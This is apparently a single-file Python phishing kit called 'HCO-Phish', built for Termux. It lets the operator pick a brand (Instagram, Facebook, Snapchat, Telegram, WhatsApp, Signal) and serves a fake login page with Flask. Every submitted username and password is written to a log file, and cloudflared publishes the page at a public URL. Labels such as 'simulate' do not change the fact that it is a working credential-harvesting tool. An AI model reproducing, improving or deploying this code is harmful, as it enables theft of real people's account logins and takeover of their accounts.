#!/usr/bin/env python3
# HCO-Phish Single File Version
# Works in Termux, colored menu, cloudflared public URL, separate login pages

import os
import sys
import time
from colorama import Fore, Style, init
from flask import Flask, render_template_string, request
import subprocess

init(autoreset=True)

# ------------------ Termux Menu ------------------ #
def show_menu():
    print(Fore.CYAN + "="*60)
    print(Fore.MAGENTA + "MENU — choose a template (enter number):")
    print(Fore.YELLOW + "1) 📷  Instagram")
    print(Fore.BLUE + "2) 📘  Facebook")
    print(Fore.LIGHTMAGENTA_EX + "3) 👻  Snapchat")
    print(Fore.LIGHTCYAN_EX + "4) ✈️  Telegram")
    print(Fore.LIGHTGREEN_EX + "5) 💬  Whatsapp")
    print(Fore.LIGHTBLUE_EX + "6) 🔵  Signal")
    print(Fore.RED + "0) Exit")
    print(Fore.CYAN + "="*60)

choice = None
while choice not in ["0","1","2","3","4","5","6"]:
    show_menu()
    choice = input(Fore.GREEN + "Select (0-6): ").strip()

if choice == "0":
    print(Fore.RED + "[!] Exiting...")
    sys.exit()

services = {
    "1":"Instagram",
    "2":"Facebook",
    "3":"Snapchat",
    "4":"Telegram",
    "5":"Whatsapp",
    "6":"Signal"
}

selected_service = services[choice]
print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")
print(Fore.CYAN + "[*] Starting local Flask server...")

# ------------------ Flask App ------------------ #
app = Flask(__name__)

# Templates for each service
templates = {
    "Instagram": """
    <html><head><title>Instagram Login</title>
    <style>
    body{background:#1c1c1c;color:#fff;font-family:Arial;text-align:center;}
    input{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;}
    button{padding:10px 20px;margin-top:10px;background:#405DE6;color:white;border:none;border-radius:5px;cursor:pointer;}
    h1{color:#f06292;}
    </style></head>
    <body>
    <h1>Instagram Login</h1>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
    </body></html>
    """,
    "Facebook": """
    <html><head><title>Facebook Login</title>
    <style>
    body{background:#1877f2;color:white;font-family:Arial;text-align:center;}
    input{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;}
    button{padding:10px 20px;margin-top:10px;background:#42b72a;color:white;border:none;border-radius:5px;cursor:pointer;}
    h1{color:#fff;}
    </style></head>
    <body>
    <h1>Facebook Login</h1>
    <form method="POST">
      <input type="text" name="username" placeholder="Email or Phone" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
    </body></html>
    """,
    "Snapchat": "<h2>Snapchat Page Placeholder</h2>",
    "Telegram": "<h2>Telegram Page Placeholder</h2>",
    "Whatsapp": "<h2>Whatsapp Page Placeholder</h2>",
    "Signal": "<h2>Signal Page Placeholder</h2>"
}

@app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
def service_page():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        with open("simulation_log.txt","a") as f:
            f.write(f"[{selected_service}] {username}:{password}\n")
        return f"<h2>{selected_service} Login submitted successfully!</h2>"
    return render_template_string(templates[selected_service])

# ------------------ Cloudflared ------------------ #
def start_cloudflared():
    if subprocess.run(["which","cloudflared"], capture_output=True).returncode == 0:
        print(Fore.CYAN + "[*] Starting cloudflared...")
        proc = subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        try:
            url = subprocess.check_output("curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9.-]*\\.trycloudflare\\.com'", shell=True).decode().strip()
            print(Fore.LIGHTGREEN_EX + f"[*] Public URL: {url}/simulate/{selected_service.lower()}")
        except:
            print(Fore.RED + "[!] Could not get public URL")
    else:
        print(Fore.YELLOW + "[!] Cloudflared not installed. Skipping public URL...")

start_cloudflared()

# ------------------ Run Flask ------------------ #
app.run(host="0.0.0.0", port=5000)
